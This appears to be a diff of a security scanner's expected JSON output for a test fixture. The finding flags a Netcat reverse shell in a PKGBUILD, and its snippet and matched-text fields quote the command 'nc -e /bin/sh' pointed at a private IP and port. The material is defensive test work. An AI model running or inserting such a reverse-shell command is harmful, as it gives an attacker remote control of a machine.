@@ -25,17 +25,17 @@
       "severity": "critical",
       "category": "malicious_code",
       "title": "Netcat reverse shell",
-      "description": "Netcat with execute flag indicates reverse shell",
+      "description": "Netcat with an execute flag indicates a reverse shell",
       "location": {
         "file": "tests/fixtures/malicious/reverse-shell/PKGBUILD",
         "line": 19,
-        "column": 5,
+        "column": 4,
         "snippet": "    nc -e /bin/sh 192.168.1.100 4444"
       },
       "recommendation": "Remove reverse shell code immediately",
       "cwe_id": "CWE-506",
       "metadata": {
-        "matched_text": "nc -e "
+        "matched_text": " nc -e"
       }
     },
     {
@@ -76,6 +76,6 @@
   "scanned_files": [
     "tests/fixtures/malicious/reverse-shell/PKGBUILD"
   ],
-  "timestamp": "2026-06-15T13:48:50.142019448Z",
-  "scan_duration_ms": 5
+  "timestamp": "2026-11-10T14:51:07.176156691Z",
+  "scan_duration_ms": 17
 }
